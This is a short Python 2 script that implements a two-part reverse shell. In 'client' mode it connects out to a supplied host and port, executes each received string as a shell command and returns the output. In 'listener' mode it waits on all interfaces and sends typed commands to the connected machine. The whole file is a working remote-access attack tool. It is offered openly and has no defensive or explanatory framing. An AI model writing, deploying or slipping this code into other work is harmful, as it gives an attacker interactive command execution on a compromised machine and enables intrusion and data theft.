#!/usr/bin/env python

import socket
import subprocess 
import sys 


def reverse_client(host,port):

	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	client.connect((host,port))

	data ="dummy"

	while data:
		#receive shell Command
		data = client.recv(1024)
		
		if data == "bye":
			break
	
		#execute the shell command
		process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

		shellOutput = process.stdout.read() + process.stderr.read()

		client.send(shellOutput)

	client.close()


def listener(port):
	host="0.0.0.0"

	server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	#The socket shall be reusable, in order to be immediately available for reuse
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,True)

	server.bind((host,port))
	

	server.listen(5)
	print "Listening for connections on %s:%d" %(host,port)


	conn, (client_host, client_port) = server.accept()
	print "Connection received from %s:%d" %(client_host, client_port)

	while True:
		command = raw_input("Enter a shell command or \"bye\" to quit:")
		if command == "bye": break
		
		conn.send(command)
		
		data = conn.recv(1024)
		print data

	conn.close()



def main():

	if len(sys.argv) >4 or len(sys.argv) <= 2: 
		print "Wrong Parameters provided!"
		print "usage for client: ./reverse_shell client 10.0.0.1 9999"
		print "usage for listener: ./reverse_shell listener 9999"
		sys.exit(1)


	if sys.argv[1] == "client":
		reverse_client(str(sys.argv[2]),int(sys.argv[3]))	
	elif sys.argv[1] =="listener":
		listener(int(sys.argv[2]))
	else:
	 	print "unknown entity \"%s\" please issue client or listener!"%sys.argv[1]

if __name__ =="__main__":
	main()
